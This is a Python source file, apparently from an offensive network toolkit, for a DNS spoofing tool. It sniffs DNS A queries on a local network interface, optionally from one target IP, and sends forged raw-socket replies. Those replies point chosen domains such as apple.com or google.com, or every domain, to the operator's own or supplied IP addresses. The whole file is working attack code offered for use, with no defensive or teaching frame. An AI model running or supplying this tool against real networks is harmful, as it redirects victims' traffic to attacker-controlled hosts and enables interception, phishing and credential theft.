#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(abspath(__file__)))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from network import DNS_raw
from ipaddress import IPv4Address
from argparse import ArgumentParser
from scapy.all import sniff, Ether, IP, UDP, DNS
from socket import socket, AF_PACKET, SOCK_RAW, gethostbyname
from random import randint
# endregion

# region Check user and platform
Base = Base()
Base.check_user()
Base.check_platform()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='DNS server')

parser.add_argument('-i', '--interface', help='Set interface name for send DNS reply packets', default=None)
parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)

parser.add_argument('--fake_domains', help='Set fake domain or domains, example: --fake_domains "apple.com,google.com"',
                    default=None)
parser.add_argument('--fake_ip', help='Set fake IP address or addresses, example: --fake_ip "192.168.0.1,192.168.0.2"',
                    default=None)

parser.add_argument('-f', '--fake_answer', action='store_true', help='Set your IPv4 address in all answers')
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Set global variables
dns = DNS_raw()
target_ip_address = None

fake_domains = []
fake_ip_addresses = []
# endregion

# region Create fake domains list
if args.fake_domains is not None:

    # Delete spaces
    fake_domains_string = args.fake_domains.replace(" ", "")

    # Create list
    for domain_name in fake_domains_string.split(","):
        fake_domains.append(domain_name)
# endregion

# region Create fake ipv4 addresses list
if args.fake_ip is not None:

    # Delete spaces
    fake_ip_string = args.fake_ip.replace(" ", "")

    # Create list
    for ip_address in fake_ip_string.split(","):
        if Base.ip_address_validation(ip_address):
            fake_ip_addresses.append(ip_address)
        else:
            Base.print_error("Illegal IPv4 address: ", ip_address)
            exit(1)
# endregion

# region Get your network settings
if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing DNS queries ...")
current_network_interface = Base.netiface_selection(args.interface)

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have MAC address!")
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", current_network_interface, " do not have IP address!")
    exit(1)
# endregion

# region Create raw socket
SOCK = socket(AF_PACKET, SOCK_RAW)
SOCK.bind((current_network_interface, 0))
# endregion

# region Get first and last IP address in your network
first_ip_address = str(IPv4Address(unicode(Base.get_netiface_first_ip(current_network_interface))) - 1)
last_ip_address = str(IPv4Address(unicode(Base.get_netiface_last_ip(current_network_interface))) + 1)
# endregion

# region Check target IP
if args.target_ip is not None:
    if not Base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address):
        Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                         "; target IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        target_ip_address = args.target_ip
# endregion


# region DNS reply function
def dns_reply(request):

    # region Define global variables
    global SOCK
    global dns
    global args
    global your_ip_address
    # endregion

    # region DNS query
    if request.haslayer(DNS):
        try:
            # region Local variables

            # source_mac_address = str(request[Ether].src)
            # destination_mac_address = str(request[Ether].dst)
            # source_ip_address = str(request[IP].src)
            # destination_ip_address = str(request[IP].dst)
            # source_udp_port = str(request[UDP].sport)
            # destination_udp_port = str(request[UDP].dport)
            # dns_transation_id = str(request[DNS].id)
            # dns_opcode = str(request[DNS].opcode)
            # dns_query_type = str(request[DNS].qd.qtype)
            # dns_query_class = str(request[DNS].qd.qclass)
            # dns_query_name = str(request[DNS].qd.qname)

            dns_answer_packet = None

            # endregion

            # region Sniff DNS A query
            if request[DNS].qd.qtype == 1:

                # region Create query
                if request[DNS].qd.qname.endswith("."):
                    query_name = request[DNS].qd.qname[:-1]
                else:
                    query_name = request[DNS].qd.qname

                query = [
                    {"type": int(request[DNS].qd.qtype),
                     "class": int(request[DNS].qd.qclass),
                     "name": query_name}
                ]
                # endregion

                # region Create answer

                # region Local variables
                addresses = []
                answer = []
                # endregion

                # region Script arguments condition check

                # Fake domains list is set
                if len(fake_domains) > 0:

                    # Fake domains list is set and DNS query name in fake domains list
                    if query_name in fake_domains:

                        # Fake ip addresses list is set
                        if len(fake_ip_addresses) > 0:
                            addresses = fake_ip_addresses

                        # Fake ip addresses list is NOT set
                        else:
                            addresses.append(your_ip_address)

                    # Fake domains list is set and DNS query name NOT in fake domains list
                    else:
                        addresses.append(gethostbyname(query_name))

                # Fake domains list is NOT set
                else:

                    # Fake domains list is NOT set and Fake ip addresses list is set
                    if len(fake_ip_addresses) > 0:
                        addresses = fake_ip_addresses

                    # Fake domains list is NOT set and Fake ip addresses list is NOT set
                    else:

                        # Argument fake_answer is set
                        if args.fake_answer:
                            addresses.append(your_ip_address)

                        # Argument fake_answer is NOT set
                        else:
                            addresses.append(gethostbyname(query_name))

                # endregion

                # region Create answer list
                for address in addresses:
                    answer.append({"name": query_name,
                                   "type": int(request[DNS].qd.qtype),
                                   "class": int(request[DNS].qd.qclass),
                                   "ttl": 0xffff,
                                   "address": address})
                # endregion

                # endregion

                # region Info message
                Base.print_info("DNS query from: ", request[IP].src, " type: ", "A",
                                " name: ", query_name, " answer: ", (" ".join(addresses)))
                # endregion

                # region Make dns answer packet
                dns_answer_packet = dns.make_response_packet(src_mac=request[Ether].dst,
                                                             dst_mac=request[Ether].src,
                                                             src_ip=request[IP].dst,
                                                             dst_ip=request[IP].src,
                                                             src_port=53,
                                                             dst_port=request[UDP].sport,
                                                             tid=request[DNS].id,
                                                             flags=0x8580,
                                                             queries=query,
                                                             answers_address=answer)
                # endregion

            # endregion

            # region If dns answer packet is not None - send packet
            if dns_answer_packet is not None:
                SOCK.send(dns_answer_packet)
            # endregion

        except:
            pass
    # endregion

# endregion


# region Main function
if __name__ == "__main__":

    if target_ip_address is None:
        Base.print_info("Waiting for DNS query on interface: ", current_network_interface)
        sniff(filter="udp and dst port 53", prn=dns_reply, iface=current_network_interface)

    else:
        Base.print_info("Waiting for DNS query from: ", target_ip_address)
        sniff(filter="host " + target_ip_address + " and udp and dst port 53",
              prn=dns_reply, iface=current_network_interface)
# endregion
